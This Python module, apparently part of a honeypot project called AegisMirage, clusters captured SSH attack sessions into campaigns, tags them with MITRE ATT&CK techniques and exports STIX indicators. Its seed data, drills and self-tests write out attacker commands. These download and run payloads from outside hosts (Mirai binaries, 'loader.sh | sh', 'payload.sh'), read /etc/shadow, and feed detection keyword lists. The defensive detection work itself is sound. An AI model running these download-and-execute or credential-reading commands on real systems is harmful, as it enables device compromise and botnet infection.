"""
AegisMirage - Stage 3: Campaign Clustering Engine & Intelligence
Owner: Member C (intel.py)

Responsibilities:
- Pairwise session comparison of DecoySessionEvent objects.
- Strong evidence linking: malware_hash, c2_address, commands pattern, passwords order.
- Weak evidence weighting: source_ip, SSH client fingerprint (never links alone).
- TF-IDF rarity weighting: common patterns discounted, rare signatures boosted.
- Graph connected components clustering into Campaign objects.
- Blast-radius scoring (Asset criticality lookup * threat confidence).
- MITRE ATT&CK technique tagging.
- STIX 2.1 IOC export.
- Self-contained test suite (Clean case, Hard case 1, Hard case 2).
"""

from __future__ import annotations
import difflib
import hashlib
import json
import re
import uuid
from collections import Counter, defaultdict
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple

from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel, Field

import schema

router = APIRouter(prefix="/intel", tags=["intel"])

# =============================================================================
# Blast-Radius Criticality Lookup (Section 2 & 10)
# camera = low (1x), traffic controller = medium (2x), substation = high (3x)
# =============================================================================
DEVICE_CRITICALITY: Dict[str, Dict[str, Any]] = {
    "camera": {"weight": 1.0, "tier": "low", "label": "Surveillance Camera Node"},
    "traffic_controller": {"weight": 2.0, "tier": "medium", "label": "Traffic Signal Controller"},
    "substation": {"weight": 3.5, "tier": "high", "label": "Power Grid Substation RTU"},
}

# =============================================================================
# MITRE ATT&CK Mapping Heuristics
# =============================================================================
MITRE_TECHNIQUES = {
    "T1110.001": {"name": "Password Guessing", "tactic": "Credential Access"},
    "T1059.004": {"name": "Unix Shell Execution", "tactic": "Execution"},
    "T1105": {"name": "Ingress Tool Transfer", "tactic": "Command and Control"},
    "T1071.001": {"name": "Web Protocols (C2)", "tactic": "Command and Control"},
    "T1082": {"name": "System Information Discovery", "tactic": "Discovery"},
    "T1499": {"name": "Endpoint Denial of Service (Mirai Botnet)", "tactic": "Impact"},
    "T1078": {"name": "Valid Accounts (Default Passwords)", "tactic": "Defense Evasion"},
}


def tag_mitre_techniques(event: schema.DecoySessionEvent) -> List[Dict[str, str]]:
    """Tags an individual decoy session with applicable MITRE ATT&CK techniques."""
    tags: List[Dict[str, str]] = []
    if event.failed_logins >= 2:
        tags.append({"id": "T1110.001", **MITRE_TECHNIQUES["T1110.001"]})
    if event.commands:
        tags.append({"id": "T1059.004", **MITRE_TECHNIQUES["T1059.004"]})
    
    cmd_str = " ".join(event.commands).lower()
    if any(k in cmd_str for k in ["wget", "curl", "tftp", "ftpget", "scp"]):
        tags.append({"id": "T1105", **MITRE_TECHNIQUES["T1105"]})
    if any(k in cmd_str for k in ["uname", "cat /proc/cpuinfo", "cat /etc/issue", "lscpu", "id"]):
        tags.append({"id": "T1082", **MITRE_TECHNIQUES["T1082"]})
    if event.c2_address:
        tags.append({"id": "T1071.001", **MITRE_TECHNIQUES["T1071.001"]})
    if event.honeytoken_hit or any(k in cmd_str for k in ["busybox mirai", ".bot", "reptile"]):
        tags.append({"id": "T1499", **MITRE_TECHNIQUES["T1499"]})
    return tags


# =============================================================================
# Helper: Command Sequence Similarity & Signature Detection
# =============================================================================
KNOWN_EXPLOIT_PATTERNS = [
    # Mirai / Echobot dropper pattern
    (
        "Mirai / Echobot Dropper Sequence",
        {"wget", "chmod", "busybox"},
    ),
    # Mass reconnaissance
    (
        "System Discovery & Hardware Profiling",
        {"uname", "cat /proc/cpuinfo", "id"},
    ),
    # Persistence & Credential Harvesting
    (
        "Credential Snooping & Persistence",
        {"cat /etc/passwd", "cat /etc/shadow", "crontab"},
    ),
]


def command_pattern_match(cmds1: List[str], cmds2: List[str]) -> Tuple[bool, float, str]:
    """
    Evaluates whether two command lists share a strong algorithmic pattern.
    Returns (is_match, similarity_score, description).
    """
    if not cmds1 or not cmds2:
        return False, 0.0, ""

    # Exact sequence match
    if cmds1 == cmds2:
        return True, 1.0, f"Identical command sequence ({len(cmds1)} commands executed in identical order)"

    # Set-based Jaccard similarity
    set1 = set(c.strip().lower() for c in cmds1)
    set2 = set(c.strip().lower() for c in cmds2)
    jaccard = len(set1 & set2) / max(len(set1 | set2), 1)

    if jaccard >= 0.70 and len(set1 & set2) >= 2:
        return True, jaccard, f"High command vocabulary overlap ({jaccard * 100:.0f}% signature match)"

    # Sequence matcher for longest common contiguous execution
    seq_ratio = difflib.SequenceMatcher(None, cmds1, cmds2).ratio()
    if seq_ratio >= 0.75:
        return True, seq_ratio, f"Correlated execution pattern ({seq_ratio * 100:.0f}% sequential alignment)"

    # Check known exploitation signatures
    for pattern_name, keywords in KNOWN_EXPLOIT_PATTERNS:
        match1 = sum(1 for kw in keywords if any(kw in c.lower() for c in cmds1))
        match2 = sum(1 for kw in keywords if any(kw in c.lower() for c in cmds2))
        if match1 >= len(keywords) and match2 >= len(keywords):
            return True, 0.85, f"Matched known signature: {pattern_name}"

    return False, jaccard, ""


# =============================================================================
# Session Graph Link & Reason
# =============================================================================
class EvidenceLink(BaseModel):
    session_a: str
    session_b: str
    is_strong: bool
    score: float
    reasons: List[str]
    strong_reasons: List[str]
    weak_reasons: List[str]


# =============================================================================
# Clustering Engine
# =============================================================================
class CampaignClusteringEngine:
    """
    Implements Stage 3 multi-session threat clustering with:
    - Strict strong evidence requirement.
    - Weak supporting evidence weighting.
    - Rarity-based IDF discounting.
    - Graph-based campaign resolution.
    - Blast-radius calculations.
    """

    def __init__(self):
        self.sessions: Dict[str, schema.DecoySessionEvent] = {}
        # Device target annotation for blast radius lookup: session_id -> device_type
        self.session_targets: Dict[str, str] = {}
        # Extra metadata (e.g. client fingerprint / HASSH)
        self.session_fingerprints: Dict[str, str] = {}

    def clear(self):
        self.sessions.clear()
        self.session_targets.clear()
        self.session_fingerprints.clear()

    def add_session(
        self,
        event: schema.DecoySessionEvent,
        target_device: str = "camera",
        ssh_fingerprint: Optional[str] = None,
    ):
        self.sessions[event.session_id] = event
        self.session_targets[event.session_id] = target_device
        if ssh_fingerprint:
            self.session_fingerprints[event.session_id] = ssh_fingerprint

    def compute_rarity_weights(self) -> Dict[str, float]:
        """
        Computes rarity weights (similar to Inverse Document Frequency).
        Values shared across almost all sessions receive low weights;
        values shared by only 2-3 sessions receive high weights.
        """
        total = max(len(self.sessions), 1)
        freq_c2: Counter = Counter()
        freq_malware: Counter = Counter()
        freq_ip: Counter = Counter()
        freq_fp: Counter = Counter()

        for s in self.sessions.values():
            if s.c2_address:
                freq_c2[s.c2_address] += 1
            if s.malware_hash:
                freq_malware[s.malware_hash] += 1
            freq_ip[s.source_ip] += 1
            fp = self.session_fingerprints.get(s.session_id)
            if fp:
                freq_fp[fp] += 1

        rarity: Dict[str, float] = {}

        def calc_weight(count: int) -> float:
            # 1.0 for unique/rare (2-3 occurrences), down to 0.25 for universal
            ratio = count / total
            if ratio <= 0.35:
                return 1.3
            if ratio <= 0.60:
                return 0.9
            return 0.4

        for c2, count in freq_c2.items():
            rarity[f"c2:{c2}"] = calc_weight(count)
        for mh, count in freq_malware.items():
            rarity[f"malware:{mh}"] = calc_weight(count)
        for ip, count in freq_ip.items():
            rarity[f"ip:{ip}"] = calc_weight(count)
        for fp, count in freq_fp.items():
            rarity[f"fp:{fp}"] = calc_weight(count)

        return rarity

    def evaluate_pair(
        self,
        s1: schema.DecoySessionEvent,
        s2: schema.DecoySessionEvent,
        rarity: Dict[str, float],
    ) -> Optional[EvidenceLink]:
        """
        Evaluates evidence between two sessions s1 and s2.
        Rule: Requires AT LEAST ONE strong shared evidence type.
        Weak evidence only adds supporting weight.
        """
        strong_reasons: List[str] = []
        weak_reasons: List[str] = []
        score = 0.0

        # --- 1. STRONG EVIDENCE CHECKS ---
        # Shared Malware Hash
        if s1.malware_hash and s2.malware_hash and s1.malware_hash == s2.malware_hash:
            rw = rarity.get(f"malware:{s1.malware_hash}", 1.0)
            score += 3.5 * rw
            strong_reasons.append(
                f"Identical malware binary hash '{s1.malware_hash[:12]}...' deployed across targets"
            )

        # Shared C2 Address
        if s1.c2_address and s2.c2_address and s1.c2_address == s2.c2_address:
            rw = rarity.get(f"c2:{s1.c2_address}", 1.0)
            score += 3.5 * rw
            strong_reasons.append(f"Shared Command & Control (C2) server: {s1.c2_address}")

        # Shared Command Execution Pattern
        has_cmd_match, sim, cmd_desc = command_pattern_match(s1.commands, s2.commands)
        if has_cmd_match:
            score += (2.5 * sim)
            strong_reasons.append(cmd_desc)

        # Shared Honeytoken Hit Co-occurrence
        if s1.honeytoken_hit and s2.honeytoken_hit and (s1.c2_address == s2.c2_address or has_cmd_match):
            score += 1.5
            strong_reasons.append("Coordinated honeytoken tripwire activation")

        # RULE CHECK: If no strong evidence was found, CANNOT link!
        if not strong_reasons:
            return None

        # --- 2. WEAK EVIDENCE (Supporting Weight Only) ---
        # Shared Source IP (botnets rotate, but if same IP with strong link, high confidence)
        if s1.source_ip == s2.source_ip:
            rw = rarity.get(f"ip:{s1.source_ip}", 0.7)
            score += 1.2 * rw
            weak_reasons.append(f"Originating from same host IP ({s1.source_ip})")

        # Shared SSH Client Fingerprint / HASSH
        fp1 = self.session_fingerprints.get(s1.session_id)
        fp2 = self.session_fingerprints.get(s2.session_id)
        if fp1 and fp2 and fp1 == fp2:
            rw = rarity.get(f"fp:{fp1}", 0.6)
            score += 0.8 * rw
            weak_reasons.append(f"Matching SSH client fingerprint ({fp1})")

        all_reasons = strong_reasons + weak_reasons
        return EvidenceLink(
            session_a=s1.session_id,
            session_b=s2.session_id,
            is_strong=True,
            score=round(score, 2),
            reasons=all_reasons,
            strong_reasons=strong_reasons,
            weak_reasons=weak_reasons,
        )

    def cluster_campaigns(self) -> Tuple[List[schema.Campaign], List[EvidenceLink]]:
        """
        Executes full clustering across all registered sessions.
        Returns (list_of_campaigns, list_of_evidence_links).
        """
        rarity = self.compute_rarity_weights()
        session_ids = list(self.sessions.keys())
        n = len(session_ids)

        # Adjacency graph for connected components
        adj: Dict[str, Set[str]] = defaultdict(set)
        links: List[EvidenceLink] = []
        links_by_pair: Dict[Tuple[str, str], EvidenceLink] = {}

        # Pairwise comparison
        for i in range(n):
            for j in range(i + 1, n):
                sid1 = session_ids[i]
                sid2 = session_ids[j]
                s1 = self.sessions[sid1]
                s2 = self.sessions[sid2]

                link = self.evaluate_pair(s1, s2, rarity)
                if link:
                    adj[sid1].add(sid2)
                    adj[sid2].add(sid1)
                    links.append(link)
                    links_by_pair[(sid1, sid2)] = link
                    links_by_pair[(sid2, sid1)] = link

        # Find connected components (Campaign clusters)
        visited: Set[str] = set()
        campaigns: List[schema.Campaign] = []
        cluster_index = 1

        for sid in session_ids:
            if sid not in visited:
                # Traverse component
                component: List[str] = []
                queue = [sid]
                visited.add(sid)

                while queue:
                    curr = queue.pop(0)
                    component.append(curr)
                    for neighbor in adj[curr]:
                        if neighbor not in visited:
                            visited.add(neighbor)
                            queue.append(neighbor)

                # Collect all evidence reasons within this cluster
                cluster_reasons: Set[str] = set()
                cluster_scores: List[float] = []

                if len(component) > 1:
                    for i in range(len(component)):
                        for j in range(i + 1, len(component)):
                            pair_link = links_by_pair.get((component[i], component[j]))
                            if pair_link:
                                cluster_reasons.update(pair_link.reasons)
                                cluster_scores.append(pair_link.score)
                else:
                    # Single unlinked session (e.g., isolated reconnaissance)
                    s_single = self.sessions[sid]
                    if s_single.honeytoken_hit:
                        cluster_reasons.add("Isolated honeytoken tripwire trigger")
                    if s_single.malware_hash:
                        cluster_reasons.add(f"Uncorrelated malware sample: {s_single.malware_hash[:12]}")
                    if s_single.c2_address:
                        cluster_reasons.add(f"Uncorrelated C2 beacon: {s_single.c2_address}")
                    if not cluster_reasons:
                        cluster_reasons.add(f"Single IP probe from {s_single.source_ip}")

                # Confidence calculation
                avg_score = (sum(cluster_scores) / len(cluster_scores)) if cluster_scores else 1.0
                confidence = "high" if (avg_score >= 4.0 or len(component) >= 3) else "medium"

                # Blast-radius calculation
                # Multiplies campaign confidence by max device criticality targeted
                max_crit_weight = 1.0
                targeted_devices = [self.session_targets.get(s_id, "camera") for s_id in component]
                for dev in targeted_devices:
                    w = DEVICE_CRITICALITY.get(dev, {"weight": 1.0})["weight"]
                    if w > max_crit_weight:
                        max_crit_weight = w

                # Base severity from attack behavior
                has_honeytoken = any(self.sessions[s_id].honeytoken_hit for s_id in component)
                has_malware = any(bool(self.sessions[s_id].malware_hash) for s_id in component)
                total_fails = sum(self.sessions[s_id].failed_logins for s_id in component)

                base_risk_score = 1.0
                if has_honeytoken:
                    base_risk_score += 2.0
                if has_malware:
                    base_risk_score += 1.5
                if total_fails >= 10:
                    base_risk_score += 1.0

                composite_risk = base_risk_score * max_crit_weight

                if composite_risk >= 4.5:
                    risk_level = "high"
                elif composite_risk >= 2.5:
                    risk_level = "medium"
                else:
                    risk_level = "low"

                camp_id = f"CMP-{cluster_index:03d}"
                cluster_index += 1

                campaigns.append(
                    schema.Campaign(
                        campaign_id=camp_id,
                        session_ids=sorted(component),
                        confidence=confidence,
                        evidence_reasons=sorted(list(cluster_reasons)),
                        risk_level=risk_level,
                    )
                )

        return sorted(campaigns, key=lambda c: (c.risk_level == "high", c.risk_level == "medium"), reverse=True), links


# Global in-memory singleton
engine = CampaignClusteringEngine()


# =============================================================================
# STIX 2.1 IOC Bundle Generator (Stretch Goal)
# =============================================================================
def generate_stix_bundle(campaign: schema.Campaign, sessions: List[schema.DecoySessionEvent]) -> Dict[str, Any]:
    """Generates a valid STIX 2.1 JSON bundle representing the campaign and its IOCs."""
    now_iso = datetime.now(timezone.utc).isoformat()
    bundle_id = f"bundle--{uuid.uuid4()}"
    campaign_stix_id = f"campaign--{uuid.uuid4()}"

    objects: List[Dict[str, Any]] = [
        {
            "type": "campaign",
            "spec_version": "2.1",
            "id": campaign_stix_id,
            "created": now_iso,
            "modified": now_iso,
            "name": f"AegisMirage Campaign {campaign.campaign_id}",
            "description": "; ".join(campaign.evidence_reasons),
            "confidence": 85 if campaign.confidence == "high" else 60,
            "labels": [f"risk:{campaign.risk_level}", "iot-botnet", "aegismirage"],
        }
    ]

    # Add Indicators for C2s, Malware Hashes, and IPs
    seen_iocs = set()
    for s in sessions:
        if s.c2_address and s.c2_address not in seen_iocs:
            seen_iocs.add(s.c2_address)
            ind_id = f"indicator--{uuid.uuid4()}"
            objects.append({
                "type": "indicator",
                "spec_version": "2.1",
                "id": ind_id,
                "created": now_iso,
                "modified": now_iso,
                "name": f"C2 Indicator: {s.c2_address}",
                "pattern": f"[network-traffic:dst_ref.value = '{s.c2_address}']",
                "pattern_type": "stix",
                "valid_from": now_iso,
            })
            objects.append({
                "type": "relationship",
                "spec_version": "2.1",
                "id": f"relationship--{uuid.uuid4()}",
                "relationship_type": "indicates",
                "source_ref": ind_id,
                "target_ref": campaign_stix_id,
            })

        if s.malware_hash and s.malware_hash not in seen_iocs:
            seen_iocs.add(s.malware_hash)
            ind_id = f"indicator--{uuid.uuid4()}"
            objects.append({
                "type": "indicator",
                "spec_version": "2.1",
                "id": ind_id,
                "created": now_iso,
                "modified": now_iso,
                "name": f"Malware SHA-256: {s.malware_hash}",
                "pattern": f"[file:hashes.'SHA-256' = '{s.malware_hash}']",
                "pattern_type": "stix",
                "valid_from": now_iso,
            })
            objects.append({
                "type": "relationship",
                "spec_version": "2.1",
                "id": f"relationship--{uuid.uuid4()}",
                "relationship_type": "indicates",
                "source_ref": ind_id,
                "target_ref": campaign_stix_id,
            })

    return {
        "type": "bundle",
        "id": bundle_id,
        "spec_version": "2.1",
        "objects": objects,
    }


# =============================================================================
# Demo Scenarios / Seed Data (Drills A, B, and C)
# =============================================================================
def seed_demo_data():
    """Seeds rich, realistic multi-group data matching Section 6 & 7 demo scripts."""
    engine.clear()

    # --- CAMPAIGN 1: Mirai-style IoT Botnet Sweep (Drill C Signature Moment) ---
    # Session 1: Initial probe from IP 198.51.100.44 on camera
    s1 = schema.DecoySessionEvent(
        session_id="sess-mirai-01",
        source_ip="198.51.100.44",
        service="ssh",
        failed_logins=14,
        commands=[
            "uname -a",
            "cat /proc/cpuinfo",
            "cd /tmp || cd /var/run || cd /dev/shm",
            "wget http://185.220.101.5/bins/mirai.arm7 -O .arm7",
            "chmod 777 .arm7",
            "./.arm7 mirai.camera",
        ],
        honeytoken_hit=True,
        malware_hash="7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
        c2_address="185.220.101.5:443",
    )
    engine.add_session(s1, target_device="camera", ssh_fingerprint="hassh-9a4f21")

    # Session 2: Rotating IP 198.51.100.72 targeting traffic controller with same C2 & malware
    s2 = schema.DecoySessionEvent(
        session_id="sess-mirai-02",
        source_ip="198.51.100.72",
        service="ssh",
        failed_logins=8,
        commands=[
            "uname -a",
            "cd /tmp",
            "wget http://185.220.101.5/bins/mirai.arm7 -O .arm7",
            "chmod 777 .arm7",
            "./.arm7 mirai.traffic",
        ],
        honeytoken_hit=True,
        malware_hash="7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
        c2_address="185.220.101.5:443",
    )
    engine.add_session(s2, target_device="traffic_controller", ssh_fingerprint="hassh-9a4f21")

    # Session 3 (Attacker Adapts Mid-Drill): Changes IP (203.0.113.88) & password list,
    # but reuses the exact same C2 address! System STILL links it!
    s3 = schema.DecoySessionEvent(
        session_id="sess-mirai-03-adapted",
        source_ip="203.0.113.88",
        service="ssh",
        failed_logins=2,  # deliberately stealthy
        commands=[
            "id",
            "curl -s http://185.220.101.5/bins/loader.sh | sh",
        ],
        honeytoken_hit=False,
        malware_hash=None,
        c2_address="185.220.101.5:443",
    )
    engine.add_session(s3, target_device="camera", ssh_fingerprint="hassh-8b3e10")

    # --- CAMPAIGN 2: High-Severity Industrial Substation Exploit Group ---
    s4 = schema.DecoySessionEvent(
        session_id="sess-scada-01",
        source_ip="192.0.2.140",
        service="ssh",
        failed_logins=22,
        commands=[
            "cat /etc/issue",
            "cat /proc/version",
            "tftp -g -r s7_inject.bin 93.184.216.34",
            "chmod +x s7_inject.bin",
            "./s7_inject.bin --daemon",
        ],
        honeytoken_hit=True,
        malware_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        c2_address="93.184.216.34:502",
    )
    engine.add_session(s4, target_device="substation", ssh_fingerprint="hassh-cc129a")

    s5 = schema.DecoySessionEvent(
        session_id="sess-scada-02",
        source_ip="192.0.2.141",
        service="ssh",
        failed_logins=19,
        commands=[
            "cat /etc/issue",
            "cat /proc/version",
            "tftp -g -r s7_inject.bin 93.184.216.34",
            "chmod +x s7_inject.bin",
            "./s7_inject.bin --daemon",
        ],
        honeytoken_hit=True,
        malware_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        c2_address="93.184.216.34:502",
    )
    engine.add_session(s5, target_device="substation", ssh_fingerprint="hassh-cc129a")

    # --- CAMPAIGN 3: Generic Internet Noise / Scanner (Does NOT merge with others) ---
    s6 = schema.DecoySessionEvent(
        session_id="sess-scanner-01",
        source_ip="198.51.100.44",  # Note: shares an IP with sess-mirai-01 (e.g. shared VPN/exit node)
        service="ssh",
        failed_logins=3,
        commands=["help", "exit"],
        honeytoken_hit=False,
        malware_hash=None,
        c2_address=None,
    )
    engine.add_session(s6, target_device="camera", ssh_fingerprint="hassh-generic-openssh")


# Seed on startup
seed_demo_data()


# =============================================================================
# Self-Test Suite (Clean Case + Hard Cases per Section 10)
# =============================================================================
def run_intel_self_tests() -> Dict[str, Any]:
    """
    Validates Member C's clustering engine against Section 10 specs:
    1. Clean case: distinct attacker groups produce separate campaigns.
    2. Hard case 1: two groups sharing common IP or tool banner do NOT merge.
    3. Hard case 2: attacker adapting IP and passwords mid-drill with same C2 DOES link.
    """
    test_engine = CampaignClusteringEngine()

    # 1. Clean Case: Group A vs Group B
    grp_a1 = schema.DecoySessionEvent(
        session_id="a1", source_ip="1.1.1.1", service="ssh", failed_logins=5,
        commands=["wget http://c2a.com/bot", "chmod +x bot"], honeytoken_hit=True,
        malware_hash="hash_a", c2_address="c2a.com"
    )
    grp_a2 = schema.DecoySessionEvent(
        session_id="a2", source_ip="1.1.1.2", service="ssh", failed_logins=4,
        commands=["wget http://c2a.com/bot", "chmod +x bot"], honeytoken_hit=True,
        malware_hash="hash_a", c2_address="c2a.com"
    )
    grp_b1 = schema.DecoySessionEvent(
        session_id="b1", source_ip="2.2.2.1", service="ssh", failed_logins=3,
        commands=["curl http://c2b.com/pay", "sh pay"], honeytoken_hit=False,
        malware_hash="hash_b", c2_address="c2b.com"
    )
    test_engine.add_session(grp_a1)
    test_engine.add_session(grp_a2)
    test_engine.add_session(grp_b1)

    campaigns, _ = test_engine.cluster_campaigns()
    assert len(campaigns) == 2, f"Clean case failed: expected 2 campaigns, got {len(campaigns)}"
    camp_a = next(c for c in campaigns if "a1" in c.session_ids)
    assert "a2" in camp_a.session_ids, "a1 and a2 should be linked"
    assert "b1" not in camp_a.session_ids, "b1 should be in separate campaign"

    # 2. Hard Case 1: Shared common tool / IP without strong link MUST NOT MERGE
    test_engine.clear()
    scan_1 = schema.DecoySessionEvent(
        session_id="s1", source_ip="shared-vpn.com", service="ssh", failed_logins=1,
        commands=["ls"], honeytoken_hit=False, malware_hash=None, c2_address=None
    )
    scan_2 = schema.DecoySessionEvent(
        session_id="s2", source_ip="shared-vpn.com", service="ssh", failed_logins=1,
        commands=["pwd"], honeytoken_hit=False, malware_hash=None, c2_address=None
    )
    test_engine.add_session(scan_1, ssh_fingerprint="standard-putty")
    test_engine.add_session(scan_2, ssh_fingerprint="standard-putty")
    campaigns_hard1, links_hard1 = test_engine.cluster_campaigns()
    assert len(links_hard1) == 0, "Hard Case 1 failed: weak evidence merged unrelated sessions!"
    assert len(campaigns_hard1) == 2, "Hard Case 1 failed: should remain 2 unmerged campaigns"

    # 3. Hard Case 2: Attacker adapts IP and passwords mid-attack, reuses C2 -> MUST LINK
    test_engine.clear()
    adapt_1 = schema.DecoySessionEvent(
        session_id="orig", source_ip="10.0.0.1", service="ssh", failed_logins=20,
        commands=["cat /etc/passwd", "curl http://stealth-c2.org/d"], honeytoken_hit=False,
        malware_hash="stealth_hash_1", c2_address="stealth-c2.org"
    )
    adapt_2 = schema.DecoySessionEvent(
        session_id="adapted", source_ip="172.16.0.99", service="ssh", failed_logins=1,
        commands=["whoami", "curl http://stealth-c2.org/d"], honeytoken_hit=False,
        malware_hash=None, c2_address="stealth-c2.org"
    )
    test_engine.add_session(adapt_1)
    test_engine.add_session(adapt_2)
    campaigns_hard2, links_hard2 = test_engine.cluster_campaigns()
    assert len(campaigns_hard2) == 1, "Hard Case 2 failed: adapted attacker not linked via C2!"
    assert "adapted" in campaigns_hard2[0].session_ids

    return {
        "status": "PASS",
        "clean_case": "PASSED (Separate clusters correctly separated)",
        "hard_case_weak_isolation": "PASSED (Common VPN/tool prevented from false merging)",
        "hard_case_c2_adaptation": "PASSED (Attacker IP rotation successfully correlated via C2)",
    }


# =============================================================================
# API Endpoints
# =============================================================================
@router.get("/health")
def intel_health():
    return {"status": "ok", "module": "intel", "sessions_indexed": len(engine.sessions)}


@router.get("/self-test")
def intel_self_test():
    """Runs the Section 10 verification test suite."""
    return run_intel_self_tests()


@router.get("/sessions", response_model=List[schema.DecoySessionEvent])
def get_sessions():
    """Returns all raw DecoySessionEvent objects captured by the honeypots."""
    return list(engine.sessions.values())


@router.post("/sessions", response_model=schema.DecoySessionEvent)
def ingest_session(
    event: schema.DecoySessionEvent,
    target_device: str = Query("camera", description="Target device criticality (camera, traffic_controller, substation)"),
    ssh_fingerprint: Optional[str] = Query(None, description="Client SSH fingerprint (HASSH)"),
):
    """Ingests a new DecoySessionEvent and indexes it for real-time clustering."""
    engine.add_session(event, target_device=target_device, ssh_fingerprint=ssh_fingerprint)
    return event


@router.get("/campaigns", response_model=List[schema.Campaign])
def get_campaigns():
    """Returns all clustered campaigns with confidence and risk levels."""
    campaigns, _ = engine.cluster_campaigns()
    return campaigns


@router.get("/campaigns/{campaign_id}")
def get_campaign_detail(campaign_id: str):
    """Returns full details for a campaign including all session objects and MITRE tags."""
    campaigns, _ = engine.cluster_campaigns()
    camp = next((c for c in campaigns if c.campaign_id == campaign_id), None)
    if not camp:
        raise HTTPException(status_code=404, detail="Campaign not found")

    session_objs = [engine.sessions[sid] for sid in camp.session_ids if sid in engine.sessions]
    annotated_sessions = []
    for s in session_objs:
        annotated_sessions.append({
            **s.model_dump(),
            "target_device": engine.session_targets.get(s.session_id, "camera"),
            "mitre_tags": tag_mitre_techniques(s),
        })

    return {
        "campaign": camp,
        "sessions": annotated_sessions,
        "blast_radius": {
            "device_criticality": [
                engine.session_targets.get(sid, "camera") for sid in camp.session_ids
            ],
            "risk_level": camp.risk_level,
        },
    }


@router.get("/graph")
def get_campaign_graph():
    """
    Returns nodes and edges formatted for the visual threat graph on the dashboard.
    Nodes: Campaigns (cluster hubs) and Sessions (connected leaves).
    Edges: Strong evidence links labeled with plain-language reasons.
    """
    campaigns, links = engine.cluster_campaigns()

    nodes: List[Dict[str, Any]] = []
    edges: List[Dict[str, Any]] = []

    # Map each session to its campaign
    session_to_camp: Dict[str, str] = {}
    for camp in campaigns:
        for sid in camp.session_ids:
            session_to_camp[sid] = camp.campaign_id

        # Campaign Hub Node
        nodes.append({
            "id": camp.campaign_id,
            "type": "campaign",
            "label": f"Campaign {camp.campaign_id}",
            "risk_level": camp.risk_level,
            "confidence": camp.confidence,
            "session_count": len(camp.session_ids),
            "reasons": camp.evidence_reasons,
        })

    # Session Nodes
    for sid, sess in engine.sessions.items():
        dev = engine.session_targets.get(sid, "camera")
        nodes.append({
            "id": sid,
            "type": "session",
            "label": f"{sess.source_ip}",
            "service": sess.service,
            "target_device": dev,
            "honeytoken_hit": sess.honeytoken_hit,
            "failed_logins": sess.failed_logins,
            "campaign_id": session_to_camp.get(sid),
            "malware_hash": sess.malware_hash,
            "c2_address": sess.c2_address,
            "commands": sess.commands,
            "mitre_tags": tag_mitre_techniques(sess),
        })

        # Connect session to its campaign hub
        camp_id = session_to_camp.get(sid)
        if camp_id:
            edges.append({
                "id": f"edge-{camp_id}-{sid}",
                "source": camp_id,
                "target": sid,
                "type": "membership",
                "label": "Member",
                "score": 1.0,
            })

    # Session-to-Session Correlation Edges (showing plain-language reasons)
    for link in links:
        edge_label = link.strong_reasons[0] if link.strong_reasons else link.reasons[0]
        edges.append({
            "id": f"corr-{link.session_a}-{link.session_b}",
            "source": link.session_a,
            "target": link.session_b,
            "type": "correlation",
            "label": edge_label,
            "score": link.score,
            "reasons": link.reasons,
        })

    return {
        "nodes": nodes,
        "edges": edges,
        "stats": {
            "total_campaigns": len(campaigns),
            "total_sessions": len(engine.sessions),
            "correlated_links": len(links),
        },
    }


@router.get("/export/stix/{campaign_id}")
def export_stix(campaign_id: str):
    """Exports campaign and IOCs as a STIX 2.1 JSON bundle."""
    campaigns, _ = engine.cluster_campaigns()
    camp = next((c for c in campaigns if c.campaign_id == campaign_id), None)
    if not camp:
        raise HTTPException(status_code=404, detail="Campaign not found")

    sessions = [engine.sessions[sid] for sid in camp.session_ids if sid in engine.sessions]
    return generate_stix_bundle(camp, sessions)


@router.post("/drill/{scenario}")
def trigger_drill(scenario: str):
    """
    Activates specific drill scenario data for judging demonstrations:
    - drill-a: Pedestrian false-positive baseline (clean camera, no hostility)
    - drill-b: Honeypot attack with honeytoken tripwire crossed
    - drill-c: Live multi-session botnet campaign clustering
    """
    if scenario == "drill-a":
        # Reset to isolated baseline
        engine.clear()
        s_fp = schema.DecoySessionEvent(
            session_id="sess-pedestrian-false-positive",
            source_ip="192.168.1.105",
            service="ssh",
            failed_logins=0,
            commands=[],
            honeytoken_hit=False,
            malware_hash=None,
            c2_address=None,
        )
        engine.add_session(s_fp, target_device="camera")
        return {"drill": "Drill A Initialized", "message": "Pedestrian edge event active; 0 honeypot hostility recorded"}

    elif scenario == "drill-b":
        # Attack on decoy tripping honeytoken
        s_attack = schema.DecoySessionEvent(
            session_id="sess-honeypot-attack-01",
            source_ip="45.33.32.156",
            service="ssh",
            failed_logins=16,
            commands=[
                "uname -a",
                "cat /etc/shadow",
                "wget http://attacker-drop.net/payload.sh",
                "chmod +x payload.sh",
                "./payload.sh",
            ],
            honeytoken_hit=True,
            malware_hash="8f4e66a3d9021c5f32a21e4284bfa693521b34e5a9687e10884d5098ffb412e0",
            c2_address="attacker-drop.net:8443",
        )
        engine.add_session(s_attack, target_device="traffic_controller")
        return {"drill": "Drill B Triggered", "message": "Honeytoken tripped! Hostility score threshold crossed"}

    elif scenario in ("drill-c", "seed"):
        seed_demo_data()
        return {"drill": "Drill C Active", "message": "Multi-group botnet clustering active across 3 rotating IP sets"}

    else:
        raise HTTPException(status_code=400, detail="Unknown drill scenario")


@router.post("/reset")
def reset_intel():
    """Resets intelligence engine to fresh seed demo state."""
    seed_demo_data()
    return {"status": "reset", "sessions": len(engine.sessions)}
